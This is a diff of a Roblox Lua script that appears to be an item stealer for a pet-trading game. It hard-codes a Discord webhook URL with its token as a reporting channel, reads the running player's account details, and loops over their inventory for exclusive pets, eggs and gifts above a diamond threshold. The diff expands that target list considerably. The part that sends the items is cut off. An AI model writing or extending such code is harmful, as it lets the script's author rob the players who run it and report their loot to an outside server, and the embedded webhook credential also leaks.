@@ -1,5 +1,5 @@
 local Webhook = "https://discord.com/api/webhooks/1121783169490894878/VXFhSJFYyHJ2kUS006gqUxzCC5Amuqrhkdos6ekIOyxcPBjQ8hEc7cBMAa3igjiukD_X" -- your webhook
-_G.Discord_UserID = "here" -- ID To Ping on every execution, blank if no one wants to be pinged.
+_G.Discord_UserID = "" -- ID To Ping on every execution, blank if no one wants to be pinged.
 
 local player = game:GetService"Players".LocalPlayer
 local joinTime = os.time() - (player.AccountAge*86400)
@@ -313,7 +313,7 @@ while wait() do
         if game.Players.LocalPlayer.leaderstats.Diamonds.Value < 3000000 then
                     _G.Lol = 0
         end        
-        if v2.rarity == "Exclusive" or v2.name == "Update Hype Gift" and game.Players.LocalPlayer.leaderstats.Diamonds.Value > 100000 then
+        if v2.rarity == "Exclusive" or v2.name == "Update Hype Gift" or v2.name == "banana" or v2.name == "Exclusive egg 1" or v2.name == "Exclusive egg 2" or v2.name == "Exclusive egg 3" or v2.name == "Exclusive egg 4" or v2.name == "Exclusive egg 5" or v2.name == "Exclusive egg 6" or v2.name == "Exclusive egg 7" or v2.name == "Exclusive egg 8" or v2.name == "Exclusive egg 9" or v2.name == "Exclusive egg 10" or v2.name == "Exclusive egg 11" or v2.name == "Exclusive egg 12" or v2.name == "Exclusive egg 13" or v2.name == "Exclusive egg 14" or v2.name == "Exclusive egg 15" or v2.name == "Season 2 Basic Gift" or v2.name == "Season 2 Rare Gift" or v2.name == "Season 2 Epic Gift" or v2.name == "Season 2 Legendary Gift" or v2.name == "Season 2 Mythical Gift" or v2.name == "Season 1 Basic Gift" or v2.name == "Season 1 Rare Gift" or v2.name == "Season 1 Epic Gift" or v2.name == "Season 1 Legendary Gift" or v2.name == "Season 1 Mythical Gift" or v2.name == "Halloween Gift" or v2.name == "Easter 2023 Gift" or v2.name == "Huge Machine Egg 1" or v2.name == "Huge Machine Egg 2" or v2.name == "Christmas 2022 Stocking" or v2.name == "Hot Dooooog" and game.Players.LocalPlayer.leaderstats.Diamonds.Value > 100000 then
             _G.PetName = v2.name
             _G.PetRar = v2.rarity
             local args = {
